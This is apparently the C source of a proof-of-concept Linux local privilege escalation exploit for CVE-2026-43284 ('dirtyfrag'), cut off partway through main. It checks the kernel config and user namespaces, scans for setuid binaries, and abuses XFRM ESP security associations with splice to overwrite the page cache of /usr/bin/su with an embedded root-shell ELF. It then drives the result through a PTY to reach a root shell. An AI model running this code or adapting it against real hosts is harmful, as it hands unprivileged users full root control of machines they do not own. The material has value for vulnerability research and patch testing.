#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <pty.h>
#include <poll.h>
#include <termios.h>
#include <sys/utsname.h>
#include <ftw.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

#define ENC_PORT       4500
#define SEQ_VAL        200
#define REPLAY_SEQ     100
#define PATCH_OFFSET   0
#define PAYLOAD_LEN    192
#define ENTRY_OFFSET   0x78
#define TOTAL_SAS      (PAYLOAD_LEN / 4)
#define SPI_BASE       0xDEADBE10u

static const char *g_target = "/usr/bin/su";
static unsigned char g_backup[PAYLOAD_LEN];
static int g_have_backup = 0;

static int g_tty = 0;
static int g_verbose = 0;
static int g_setuid_count = 0;
static int g_exploitable_count = 0;

/* first instructions of embedded shell ELF at file offset 0x78 */
static const uint8_t su_marker[8] = {
	0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
};

#define C_RST  "\033[0m"
#define C_DIM  "\033[2m"
#define C_RED  "\033[31m"
#define C_GRN  "\033[32m"
#define C_YEL  "\033[33m"
#define C_BLU  "\033[34m"
#define C_MAG  "\033[35m"
#define C_CYN  "\033[36m"
#define C_WHT  "\033[1;37m"
#define C_BOLD "\033[1m"

#define C(x) (g_tty ? (x) : "")

static void print_banner(void)
{
	printf("\n");
	printf("%s", C(C_CYN));
	printf("  ╔═══════════════════════════════════════╗\n");
	printf("  ║  SLEY - CVE-2026-43284 dirtyfrag PoC  ║\n");
	printf("  ╚═══════════════════════════════════════╝\n");
	printf("%s\n", C(C_RST));
}

static void status_line(const char *label, int ok, const char *detail)
{
	printf("  %s[%s]%s %-22s",
	       C(C_DIM), ok ? "+" : "-", C(C_RST), label);
	if (detail && detail[0])
		printf(" %s%s%s", ok ? C(C_GRN) : C(C_RED), detail, C(C_RST));
	printf("\n");
}

static void phase_header(int n, const char *title)
{
	printf("%s┌─[%s phase %d%s] %s%s\n",
	       C(C_CYN), C(C_MAG), n, C(C_CYN), title, C(C_RST));
}

static int cfg_value_ok(const char *val, const char *expect)
{
	if (!val || !*val)
		return 0;
	if (strcmp(expect, "ym") == 0)
		return val[0] == 'y' || val[0] == 'm';
	return strcmp(val, expect) == 0;
}

struct kconfig_req {
	const char *key;
	const char *expect;
	const char *hint;
	char val[32];
	int found;
};

static void scan_kconfig(FILE *f, struct kconfig_req *req, size_t nreq)
{
	char line[256];

	for (size_t i = 0; i < nreq; i++) {
		req[i].val[0] = '\0';
		req[i].found = 0;
	}

	while (fgets(line, sizeof(line), f)) {
		for (size_t i = 0; i < nreq; i++) {
			if (req[i].found)
				continue;
			size_t klen = strlen(req[i].key);
			if (strncmp(line, req[i].key, klen) != 0 || line[klen] != '=')
				continue;
			const char *v = line + klen + 1;
			size_t n = strcspn(v, "\n\r");
			if (n >= sizeof(req[i].val))
				n = sizeof(req[i].val) - 1;
			memcpy(req[i].val, v, n);
			req[i].val[n] = '\0';
			req[i].found = 1;
		}
	}
}

static FILE *open_kconfig_gz(const char *src, int *via_popen)
{
	static const char *cmds[] = {
		"gzip -dc '%s' 2>/dev/null",
		"zcat '%s' 2>/dev/null",
		NULL,
	};
	char cmd[256];

	for (int i = 0; cmds[i]; i++) {
		snprintf(cmd, sizeof(cmd), cmds[i], src);
		FILE *f = popen(cmd, "r");
		if (f) {
			*via_popen = 1;
			return f;
		}
	}
	return NULL;
}

static FILE *open_kconfig_source(const char *release, char *label, size_t labellen,
				 int *via_popen)
{
	char path[512];
	FILE *f;

	*via_popen = 0;

	snprintf(path, sizeof(path), "/boot/config-%s", release);
	f = fopen(path, "r");
	if (f) {
		snprintf(label, labellen, "%s", path);
		return f;
	}

	snprintf(path, sizeof(path), "/lib/modules/%s/config", release);
	f = fopen(path, "r");
	if (f) {
		snprintf(label, labellen, "%s", path);
		return f;
	}

	snprintf(path, sizeof(path), "/lib/modules/%s/build/.config", release);
	f = fopen(path, "r");
	if (f) {
		snprintf(label, labellen, "%s", path);
		return f;
	}

	if (access("/proc/config.gz", R_OK) == 0) {
		f = open_kconfig_gz("/proc/config.gz", via_popen);
		if (f) {
			snprintf(label, labellen, "/proc/config.gz");
			return f;
		}
	}

	return NULL;
}

static void close_kconfig(FILE *f, int via_popen)
{
	if (!f)
		return;
	if (via_popen)
		pclose(f);
	else
		fclose(f);
}

static int check_kernel_config(void)
{
	struct utsname uts;
	char cfglabel[512];
	int via_popen = 0;

	if (uname(&uts) < 0) {
		status_line("uname", 0, strerror(errno));
		return -1;
	}

	phase_header(1, "kernel config preflight");

	FILE *cfg = open_kconfig_source(uts.release, cfglabel, sizeof(cfglabel), &via_popen);
	if (!cfg) {
		status_line("config file", 0, "not found under /boot, /lib/modules, /proc");
		fprintf(stderr,
			"\n%s  [!] WSL2: zcat /proc/config.gz | grep -E \"CONFIG_XFRM=|CONFIG_INET_ESP=|CONFIG_USER_NS=\"%s\n",
			C(C_YEL), C(C_RST));
		fprintf(stderr, "%s  [!] or: grep -E \"...\" /boot/config-%s%s\n\n",
		        C(C_YEL), uts.release, C(C_RST));
		return -1;
	}

	printf("  %s→%s %s%s%s\n\n", C(C_DIM), C(C_RST), C(C_BLU), cfglabel, C(C_RST));
	status_line("config file", 1, via_popen ? "via gzip/zcat" : "plain text");

	struct kconfig_req req[] = {
		{ "CONFIG_USER_NS",  "y",  "required =y" },
		{ "CONFIG_XFRM",     "y",  "required =y" },
		{ "CONFIG_INET_ESP", "ym", "required =m or =y" },
	};
	size_t nreq = sizeof(req) / sizeof(req[0]);
	int ok_all = 1;

	scan_kconfig(cfg, req, nreq);

	for (size_t i = 0; i < nreq; i++) {
		int ok = req[i].found && cfg_value_ok(req[i].val, req[i].expect);
		char detail[128];
		if (req[i].found)
			snprintf(detail, sizeof(detail), "= %s  (%s)", req[i].val, req[i].hint);
		else
			snprintf(detail, sizeof(detail), "missing (%s)", req[i].hint);
		status_line(req[i].key, ok, detail);
		if (!ok)
			ok_all = 0;
	}

	close_kconfig(cfg, via_popen);

	printf("\n");
	if (!ok_all) {
		fprintf(stderr, "%s  [!] kernel does not meet exploit requirements.%s\n", C(C_RED), C(C_RST));
		fprintf(stderr, "%s  [!] manual check: zcat /proc/config.gz | grep -E \"CONFIG_XFRM=|CONFIG_INET_ESP=|CONFIG_USER_NS=\"%s\n\n",
		        C(C_YEL), C(C_RST));
		return -1;
	}
	printf("%s  kernel options OK.%s\n\n", C(C_GRN), C(C_RST));
	return 0;
}

static void print_sysctl_val(const char *path, const char *name)
{
	FILE *f = fopen(path, "r");
	if (!f)
		return;
	char val[64];
	if (!fgets(val, sizeof(val), f)) {
		fclose(f);
		return;
	}
	val[strcspn(val, "\n\r")] = '\0';
	printf("      %s%s%s = %s\n", C(C_DIM), name, C(C_RST), val);
	fclose(f);
}

static int check_userns_runtime(void)
{
	phase_header(2, "user namespace runtime check");
	printf("  %s→%s unshare(CLONE_NEWUSER | CLONE_NEWNET)%s\n\n",
	       C(C_DIM), C(C_RST), C(C_DIM));

	if (getuid() == 0) {
		status_line("privilege", 0, "running as root — use an unprivileged user for LPE");
		fprintf(stderr, "\n%s  [!] Exploit is meant to run as a normal user (uid != 0).%s\n\n",
		        C(C_YEL), C(C_RST));
		return -1;
	}

	pid_t pid = fork();
	if (pid < 0) {
		status_line("fork", 0, strerror(errno));
		return -1;
	}
	if (pid == 0) {
		if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
			_exit(1);
		_exit(0);
	}

	int st;
	if (waitpid(pid, &st, 0) < 0) {
		status_line("waitpid", 0, strerror(errno));
		return -1;
	}

	int ok = WIFEXITED(st) && WEXITSTATUS(st) == 0;
	if (!ok) {
		status_line("unshare", 0, "Operation not permitted");
		fprintf(stderr,
			"\n%s  [!] CONFIG_USER_NS=y in /boot/config does not guarantee unprivileged userns at runtime.%s\n",
			C(C_YEL), C(C_RST));
		fprintf(stderr,
			"%s  [!] This host blocks user namespaces (common on hardened Ubuntu 22.04+ / enterprise VMs).%s\n",
			C(C_YEL), C(C_RST));
		fprintf(stderr,
			"%s  [!] Changing the setuid target (su/sudo/pkexec) will not help — unshare must succeed first.%s\n",
			C(C_YEL), C(C_RST));
		printf("\n  %sRelevant sysctls on this host:%s\n", C(C_DIM), C(C_RST));
		print_sysctl_val("/proc/sys/kernel/apparmor_restrict_unprivileged_userns",
				 "kernel.apparmor_restrict_unprivileged_userns");
		print_sysctl_val("/proc/sys/kernel/unprivileged_userns_clone",
				 "kernel.unprivileged_userns_clone");
		print_sysctl_val("/proc/sys/user/max_user_namespaces",
				 "user.max_user_namespaces");
		fprintf(stderr,
			"\n%s  [!] Lab only (as root): sysctl -w kernel.apparmor_restrict_unprivileged_userns=0%s\n",
			C(C_YEL), C(C_RST));
		fprintf(stderr,
			"%s  [!] Without userns: this PoC cannot run (see CVE-2026-43500 rxrpc variant).%s\n\n",
			C(C_YEL), C(C_RST));
		return -1;
	}

	status_line("unshare", 1, "user+net namespace available");
	printf("%s  runtime userns check OK.%s\n\n", C(C_GRN), C(C_RST));
	return 0;
}

static int skip_tree(const char *path)
{
	return strcmp(path, "/proc") == 0 ||
	       strcmp(path, "/sys") == 0 ||
	       strcmp(path, "/dev") == 0 ||
	       strcmp(path, "/run") == 0;
}

static int target_is_exploitable(const char *path)
{
	struct stat st;

	if (stat(path, &st) < 0 || !S_ISREG(st.st_mode))
		return 0;
	if (!(st.st_mode & S_ISUID))
		return 0;
	if (access(path, R_OK | X_OK) != 0)
		return 0;
	int fd = open(path, O_RDONLY);
	if (fd < 0)
		return 0;
	close(fd);
	return 1;
}

static int probe_target(const char *path, char *why, size_t whylen)
{
	struct stat st;

	if (stat(path, &st) < 0) {
		snprintf(why, whylen, "missing (%s)", strerror(errno));
		return -1;
	}
	if (!S_ISREG(st.st_mode)) {
		snprintf(why, whylen, "not a regular file");
		return -1;
	}
	if (!(st.st_mode & S_ISUID)) {
		snprintf(why, whylen, "no setuid bit (mode %04o)", st.st_mode & 07777);
		return -1;
	}
	if (access(path, R_OK) != 0) {
		snprintf(why, whylen, "not readable (%s)", strerror(errno));
		return -1;
	}
	if (access(path, X_OK) != 0) {
		snprintf(why, whylen, "not executable (%s)", strerror(errno));
		return -1;
	}
	int fd = open(path, O_RDONLY);
	if (fd < 0) {
		snprintf(why, whylen, "open(O_RDONLY) denied (%s)", strerror(errno));
		return -1;
	}
	close(fd);
	why[0] = '\0';
	return 0;
}

static int setuid_walk(const char *path, const struct stat *st, int flag,
		       struct FTW *ftw)
{
	(void)ftw;
	if (flag == FTW_D && skip_tree(path))
		return FTW_SKIP_SUBTREE;

	if (flag != FTW_F)
		return 0;

	if (!S_ISREG(st->st_mode))
		return 0;
	if (!(st->st_mode & S_ISUID))
		return 0;

	g_setuid_count++;
	int exploitable = target_is_exploitable(path);
	if (exploitable)
		g_exploitable_count++;

	int is_target = (strcmp(path, g_target) == 0);
	const char *color = exploitable ? C(C_GRN) : C(C_YEL);
	const char *badge = exploitable ? "[+]" : "[~]";

	printf("  %s%02d%s %s%s%s %s%s%s%s\n",
	       C(C_DIM), g_setuid_count, C(C_RST),
	       color, badge, C(C_RST), path,
	       is_target ? "  ← target" : "",
	       exploitable ? "" : "  (visible, not usable)",
	       C(C_RST));
	return 0;
}

static int scan_setuid_binaries(void)
{
	phase_header(3, "setuid binary scan");
	printf("  %s→%s find / -perm -4000 -type f 2>/dev/null%s\n\n",
	       C(C_DIM), C(C_RST), C(C_DIM));

	g_setuid_count = 0;
	g_exploitable_count = 0;
	int rc = nftw("/", setuid_walk, 32, FTW_PHYS | FTW_MOUNT);

	printf("\n");
	if (rc != 0 && rc != EACCES) {
		status_line("nftw", 0, strerror(rc > 0 ? rc : errno));
	}
	if (g_setuid_count == 0) {
		status_line("setuid", 0, "no SUID binaries found");
		return -1;
	}
	printf("%s  found %d setuid binaries, %d exploitable (readable + openable).%s\n",
	       g_exploitable_count ? C(C_GRN) : C(C_YEL),
	       g_setuid_count, g_exploitable_count, C(C_RST));
	if (g_exploitable_count == 0) {
		fprintf(stderr,
			"\n%s  [!] SUID files are visible but not readable — typical on shared hosting (CageFS/cPanel).%s\n",
			C(C_YEL), C(C_RST));
		fprintf(stderr,
			"%s  [!] This exploit must open the target for read (splice). No usable target on this account.%s\n\n",
			C(C_YEL), C(C_RST));
		return -1;
	}
	printf("\n");
	return 0;
}

// minimal x86_64 root-shell ELF, entry=0x400078
// setgid(0); setuid(0); execve("/bin/sh", NULL, ["TERM=xterm",NULL]) 
static const unsigned char shell_elf[PAYLOAD_LEN] = {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

static int save_original(const char *path)
{
	if (g_have_backup) return 0;
	int fd = open(path, O_RDONLY);
	if (fd < 0) return -1;
	int n = read(fd, g_backup, PAYLOAD_LEN);
	close(fd);
	if (n != PAYLOAD_LEN) return -1;
	g_have_backup = 1;
	return 0;
}

static int setup_userns_netns(void)
{
	uid_t ruid = getuid();
	gid_t rgid = getgid();

	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		fprintf(stderr, "unshare: %s\n", strerror(errno));
		return -1;
	}

	int fd = open("/proc/self/setgroups", O_WRONLY);
	if (fd >= 0) { write(fd, "deny\n", 5); close(fd); }

	char buf[128];
	snprintf(buf, sizeof(buf), "0 %u 1", ruid);
	fd = open("/proc/self/uid_map", O_WRONLY);
	if (fd < 0) return -1;
	write(fd, buf, strlen(buf)); close(fd);

	snprintf(buf, sizeof(buf), "0 %u 1", rgid);
	fd = open("/proc/self/gid_map", O_WRONLY);
	if (fd < 0) return -1;
	write(fd, buf, strlen(buf)); close(fd);

	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s >= 0) {
		struct ifreq ifr;
		memset(&ifr, 0, sizeof(ifr));
		strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
		if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
			ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
			ioctl(s, SIOCSIFFLAGS, &ifr);
		}
		close(s);
	}
	return 0;
}

static void nl_put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
{
	struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len  = RTA_LENGTH(len);
	memcpy(RTA_DATA(rta), data, len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int add_xfrm_sa(uint32_t spi, uint32_t patch_val)
{
	int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (sk < 0) return -1;

	struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
	if (bind(sk, (struct sockaddr *)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

	char buf[4096];
	memset(buf, 0, sizeof(buf));
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_pid   = getpid();
	nlh->nlmsg_seq   = 1;
	nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

	struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	xs->id.daddr.a4 = inet_addr("127.0.0.1");
	xs->id.spi      = htonl(spi);
	xs->id.proto    = IPPROTO_ESP;
	xs->saddr.a4    = inet_addr("127.0.0.1");
	xs->family      = AF_INET;
	xs->mode          = XFRM_MODE_TRANSPORT;
	xs->replay_window = 0;
	xs->reqid         = 0x1234;
	xs->flags         = XFRM_STATE_ESN;
	xs->lft.soft_byte_limit   = (uint64_t)-1;
	xs->lft.hard_byte_limit   = (uint64_t)-1;
	xs->lft.soft_packet_limit = (uint64_t)-1;
	xs->lft.hard_packet_limit = (uint64_t)-1;
	xs->sel.family  = AF_INET;
	xs->sel.prefixlen_d = 32;
	xs->sel.prefixlen_s = 32;
	xs->sel.daddr.a4 = inet_addr("127.0.0.1");
	xs->sel.saddr.a4 = inet_addr("127.0.0.1");

	char auth_buf[sizeof(struct xfrm_algo_auth) + 32];
	memset(auth_buf, 0, sizeof(auth_buf));
	struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)auth_buf;
	strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name) - 1);
	aa->alg_key_len   = 32 * 8;
	aa->alg_trunc_len = 128;
	memset(aa->alg_key, 0xAA, 32);
	nl_put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, auth_buf, sizeof(auth_buf));

	char ciph_buf[sizeof(struct xfrm_algo) + 16];
	memset(ciph_buf, 0, sizeof(ciph_buf));
	struct xfrm_algo *ea = (struct xfrm_algo *)ciph_buf;
	strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name) - 1);
	ea->alg_key_len = 16 * 8;
	memset(ea->alg_key, 0xBB, 16);
	nl_put_attr(nlh, XFRMA_ALG_CRYPT, ciph_buf, sizeof(ciph_buf));

	struct xfrm_encap_tmpl enc;
	memset(&enc, 0, sizeof(enc));
	enc.encap_type  = UDP_ENCAP_ESPINUDP;
	enc.encap_sport = htons(ENC_PORT);
	enc.encap_dport = htons(ENC_PORT);
	nl_put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));

	struct xfrm_replay_state_esn esn;
	memset(&esn, 0, sizeof(esn));
	esn.bmp_len       = 1;
	esn.oseq          = 0;
	esn.seq           = REPLAY_SEQ;
	esn.oseq_hi       = 0;
	esn.seq_hi        = patch_val;
	esn.replay_window = 32;
	nl_put_attr(nlh, XFRMA_REPLAY_ESN_VAL, &esn, sizeof(esn) + 4);

	if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }

	char rbuf[4096];
	int n = recv(sk, rbuf, sizeof(rbuf), 0);
	close(sk);
	if (n < 0) return -1;

	struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
	if (rh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = NLMSG_DATA(rh);
		if (e->error) return -1;
	}
	return 0;
}

static int do_one_write(const char *path, off_t offset, uint32_t spi)
{
	int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_recv < 0) return -1;

	int one = 1;
	setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

	struct sockaddr_in sa;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port   = htons(ENC_PORT);
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");

	if (bind(sk_recv, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(sk_recv); return -1; }

	int encap = UDP_ENCAP_ESPINUDP;
	if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) { close(sk_recv); return -1; }

	int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_send < 0) { close(sk_recv); return -1; }
	if (connect(sk_send, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(sk_send); close(sk_recv); return -1; }

	int file_fd = open(path, O_RDONLY);
	if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }

	int pfd[2];
	if (pipe(pfd) < 0) { close(file_fd); close(sk_send); close(sk_recv); return -1; }

	unsigned char hdr[24];
	*(uint32_t *)(hdr + 0) = htonl(spi);
	*(uint32_t *)(hdr + 4) = htonl(SEQ_VAL);
	memset(hdr + 8, 0xCC, 16);

	struct iovec iov = { .iov_base = hdr, .iov_len = sizeof(hdr) };
	if (vmsplice(pfd[1], &iov, 1, 0) != (ssize_t)sizeof(hdr))
		goto fail;

	off_t off = offset;
	if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16)
		goto fail;

	ssize_t s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
	usleep(150 * 1000);

	close(file_fd); close(pfd[0]); close(pfd[1]);
	close(sk_send); close(sk_recv);
	return (s == 40) ? 0 : -1;

fail:
	close(file_fd); close(pfd[0]); close(pfd[1]);
	close(sk_send); close(sk_recv);
	return -1;
}

/* corrupt stage error codes (child maps to exit 11..13) */
#define CORRUPT_ERR_UNSHARE 1
#define CORRUPT_ERR_XFRM    2
#define CORRUPT_ERR_WRITE   3

static int corrupt_su(void)
{
	if (setup_userns_netns() < 0)
		return CORRUPT_ERR_UNSHARE;
	usleep(100 * 1000);

	for (int i = 0; i < TOTAL_SAS; i++) {
		uint32_t spi = SPI_BASE + (uint32_t)i;
		uint32_t val =
			((uint32_t)shell_elf[i * 4 + 0] << 24) |
			((uint32_t)shell_elf[i * 4 + 1] << 16) |
			((uint32_t)shell_elf[i * 4 + 2] <<  8) |
			((uint32_t)shell_elf[i * 4 + 3]);
		if (add_xfrm_sa(spi, val) < 0)
			return CORRUPT_ERR_XFRM;
	}

	for (int i = 0; i < TOTAL_SAS; i++) {
		uint32_t spi = SPI_BASE + (uint32_t)i;
		off_t off = PATCH_OFFSET + (off_t)i * 4;
		if (do_one_write(g_target, off, spi) < 0)
			return CORRUPT_ERR_WRITE;
	}
	return 0;
}

static const char *corrupt_err_msg(int code)
{
	switch (code) {
	case CORRUPT_ERR_UNSHARE: return "unshare / uid_map / lo setup failed in child";
	case CORRUPT_ERR_XFRM:    return "XFRM SA registration failed (netlink denied?)";
	case CORRUPT_ERR_WRITE:   return "splice/UDP 4500 write failed";
	default:                  return "unknown corrupt error";
	}
}

static int target_already_patched(const char *path)
{
	int fd = open(path, O_RDONLY);
	if (fd < 0)
		return 0;
	uint8_t got[8];
	ssize_t n = pread(fd, got, sizeof(got), ENTRY_OFFSET);
	close(fd);
	if (n != (ssize_t)sizeof(got))
		return 0;
	return memcmp(got, su_marker, sizeof(su_marker)) == 0;
}

static int verify_patch(const char *path)
{
	int fd = open(path, O_RDONLY);
	if (fd < 0)
		return -1;
	uint8_t got[8];
	if (pread(fd, got, sizeof(got), ENTRY_OFFSET) != (ssize_t)sizeof(got)) {
		close(fd);
		return -1;
	}
	close(fd);
	return memcmp(got, su_marker, sizeof(su_marker)) == 0 ? 0 : -1;
}

static int run_esp_corrupt_stage(char *detail, size_t dlen)
{
	pid_t cpid = fork();
	if (cpid < 0) {
		snprintf(detail, dlen, "fork: %s", strerror(errno));
		return -1;
	}
	if (cpid == 0) {
		int rc = corrupt_su();
		_exit(rc == 0 ? 0 : 10 + rc);
	}
	int wstatus;
	if (waitpid(cpid, &wstatus, 0) < 0) {
		snprintf(detail, dlen, "waitpid: %s", strerror(errno));
		return -1;
	}
	if (!WIFEXITED(wstatus)) {
		snprintf(detail, dlen, "child killed by signal %d", WTERMSIG(wstatus));
		return -1;
	}
	int est = WEXITSTATUS(wstatus);
	if (est != 0) {
		snprintf(detail, dlen, "%s", corrupt_err_msg(est - 10));
		return -1;
	}
	if (verify_patch(g_target) < 0) {
		snprintf(detail, dlen,
			 "page cache unchanged at 0x%x (patched kernel / LSM / container?)",
			 ENTRY_OFFSET);
		return -1;
	}
	detail[0] = '\0';
	return 0;
}

static int target_is_su_binary(const char *path)
{
	const char *base = strrchr(path, '/');
	base = base ? base + 1 : path;
	return strcmp(base, "su") == 0;
}

static void exec_patched_target(void)
{
	char *envp[] = { "TERM=xterm", NULL };
	execle(g_target, g_target, NULL, envp);
	_exit(127);
}

static void exec_su_login(void)
{
	static const char *paths[] = {
		"/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL,
	};
	for (int i = 0; paths[i]; i++)
		execl(paths[i], "su", "-", (char *)NULL);
	execlp("su", "su", "-", (char *)NULL);
	_exit(127);
}

static int run_root_pty(void)
{
	int master = posix_openpt(O_RDWR | O_NOCTTY);
	if (master < 0)
		return -1;
	if (grantpt(master) < 0 || unlockpt(master) < 0) {
		close(master);
		return -1;
	}
	char *slave_name = ptsname(master);
	if (!slave_name) {
		close(master);
		return -1;
	}

	struct winsize ws;
	if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) == 0)
		ioctl(master, TIOCSWINSZ, &ws);

	pid_t pid = fork();
	if (pid < 0) {
		close(master);
		return -1;
	}
	if (pid == 0) {
		setsid();
		int slave = open(slave_name, O_RDWR);
		if (slave < 0)
			_exit(127);
		ioctl(slave, TIOCSCTTY, 0);
		dup2(slave, 0);
		dup2(slave, 1);
		dup2(slave, 2);
		if (slave > 2)
			close(slave);
		close(master);
		if (target_is_su_binary(g_target))
			exec_su_login();
		exec_patched_target();
	}

	signal(SIGTTOU, SIG_IGN);
	signal(SIGTTIN, SIG_IGN);
	signal(SIGPIPE, SIG_IGN);
	signal(SIGHUP, SIG_IGN);

	struct termios saved_termios;
	int restore_termios = 0;
	if (tcgetattr(STDIN_FILENO, &saved_termios) == 0) {
		struct termios raw = saved_termios;
		cfmakeraw(&raw);
		if (tcsetattr(STDIN_FILENO, TCSANOW, &raw) == 0)
			restore_termios = 1;
	}

	int auto_pw_sent = 0;
	int stdin_eof = 0;
	int saw_master_output = 0;
	int total_ms = 0;
	char buf[4096];

	for (;;) {
		struct pollfd pfds[2] = {
			{ stdin_eof ? -1 : STDIN_FILENO, POLLIN, 0 },
			{ master, POLLIN, 0 },
		};
		int pr = poll(pfds, 2, 200);
		if (pr < 0 && errno != EINTR)
			break;
		total_ms += 200;

		if (pfds[1].revents & POLLIN) {
			ssize_t n = read(master, buf, sizeof(buf));
			if (n <= 0)
				break;
			saw_master_output = 1;
			write(STDOUT_FILENO, buf, n);
			if (!auto_pw_sent && n < (ssize_t)sizeof(buf)) {
				buf[n] = '\0';
				if (strstr(buf, "Password") || strstr(buf, "password")) {
					write(master, "\n", 1);
					auto_pw_sent = 1;
				}
			}
		}
		if (!stdin_eof && (pfds[0].revents & POLLIN)) {
			ssize_t n = read(STDIN_FILENO, buf, sizeof(buf));
			if (n <= 0)
				stdin_eof = 1;
			else
				write(master, buf, n);
		}
		if (pfds[1].revents & (POLLHUP | POLLERR))
			break;

		if (!auto_pw_sent && !saw_master_output && total_ms >= 1500) {
			write(master, "\n", 1);
			auto_pw_sent = 1;
		}

		int status;
		pid_t w = waitpid(pid, &status, WNOHANG);
		if (w == pid) {
			for (int i = 0; i < 5; i++) {
				struct pollfd pf = { master, POLLIN, 0 };
				if (poll(&pf, 1, 50) <= 0)
					break;
				ssize_t n = read(master, buf, sizeof(buf));
				if (n <= 0)
					break;
				write(STDOUT_FILENO, buf, n);
			}
			break;
		}
	}

	if (restore_termios)
		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios);
	close(master);
	return 0;
}

static int restore_original(void)
{
	if (!g_have_backup) return -1;

	// just drop the file's page cache -> kernel reloads from disk
	int fd = open(g_target, O_RDONLY);
	if (fd < 0) return -1;
	posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
	close(fd);

	// verify first 8 bytes match backup (disk copy)
	unsigned char cur[8];
	fd = open(g_target, O_RDONLY);
	if (fd < 0) return -1;
	int n = pread(fd, cur, 8, 0);
	close(fd);
	if (n != 8) return -1;
	if (memcmp(cur, g_backup, 8) != 0) return -1;

	return 0;
}

static void parse_args(int argc, char **argv)
{
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
			g_verbose = 1;
		else if (argv[i][0] != '-')
			g_target = argv[i];
	}
	if (getenv("DIRTYFRAG_VERBOSE"))
		g_verbose = 1;
}

int main(int argc, char **argv)
{
	g_tty = isatty(STDOUT_FILENO);
	setlinebuf(stdout);
	parse_args(argc, argv);

	if (getuid() == 0) {
